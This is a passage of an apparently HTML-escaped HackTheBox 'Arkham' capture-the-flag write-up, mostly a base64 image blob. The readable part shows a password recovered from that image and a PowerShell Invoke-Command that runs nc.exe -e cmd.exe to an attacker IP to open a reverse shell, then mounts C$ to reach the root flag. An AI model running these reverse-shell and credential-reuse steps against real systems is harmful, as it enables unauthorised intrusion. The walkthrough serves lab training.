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
AQIE5hP4/wjr8uh7Wbf/AAAAAElFTkSuQmCC


----boundary-LibPST-iamunique-672158152_-_---
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-see-two-interesting-things-here-first-one-is-this-message--master-wayne-stop-forgetting-your-password-and-second-one-is-the-base-64-encoded-image-i-decoded-it-and-saved-it-&quot;&gt;We can see two interesting things here, first one is this message : &lt;code class=&quot;highlighter-rouge&quot;&gt;Master Wayne stop forgetting your password&lt;/code&gt; and second one is the base-64 encoded image. I decoded it and saved it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# nano image001.png.b64
root@kali:~/Desktop/HTB/boxes/arkham/backups# base64 -d image001.png.b64 &amp;gt; image001.png
root@kali:~/Desktop/HTB/boxes/arkham/backups# file image001.png
image001.png: PNG image data, 677 x 343, 8-bit/color RGB, non-interlaced
root@kali:~/Desktop/HTB/boxes/arkham/backups# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;image001png-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;image001.png&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-we-have-the-password-for-batman-by-checking-the-local-group-memberships-of-batman-we-can-see-that-batman-is-in-the-administrators-group-and-also-in-the-remote-management-users-group-&quot;&gt;Great, we have the password for &lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt;. By checking the local group memberships of &lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt; we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt; is in the Administrators group, and also in the Remote management users group :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;net user batman
net user batman
User name                    Batman
Full Name
Comment
User's comment
Country/region code          001 (United States)
Account active               Yes
Account expires              Never

Password last set            2/3/2019 9:25:51 AM
Password expires             Never
Password changeable          2/3/2019 9:25:51 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/10/2019 1:29:47 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users
Global Group memberships     *None
The command completed successfully.


C:\&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-we-can-use-powershells-invoke-command-with-the-credentials-we-have-to-get-a-reverse-shell--&quot;&gt;So we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell&lt;/code&gt;’s &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Command&lt;/code&gt; with the credentials we have to get a reverse shell  :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\&amp;gt; $username = 'batman'
$username = 'batman'
PS C:\&amp;gt; $password = 'Zx^#QZX+T!123'
$password = 'Zx^#QZX+T!123'
PS C:\&amp;gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\&amp;gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\&amp;gt; Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot; -e cmd.exe 10.10.xx.xx 1338 }                                      
Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot; -e cmd.exe 10.10.xx.xx 1338 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/14.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;batman-is-in-the-administrators-group-however-i-couldnt-read-the-flag-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt; is in the Administrators group, however I couldn’t read the flag :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Batman\Documents&amp;gt;cd ../../Administrator/Desktop
cd ../../Administrator/Desktop
Access is denied.

C:\Users\Batman\Documents&amp;gt;type C:\Users\Administrator\Desktop\root.txt 
type C:\Users\Administrator\Desktop\root.txt
Access is denied.

C:\Users\Batman\Documents&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;that-was-weird-after-trying-a-lot-of-things-i-wanted-to-see-if-anything-will-change-if-i-mounted-c-then-accessed-it&quot;&gt;That was weird, after trying a lot of things I wanted to see If anything will change if I mounted &lt;code class=&quot;highlighter-rouge&quot;&gt;C$&lt;/code&gt; then accessed it.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;net use Z: \\ARKHAM\C$
net use Z: \\ARKHAM\C$
The command completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-yes-that-worked-&quot;&gt;And yes that worked :&lt;/h4&gt;
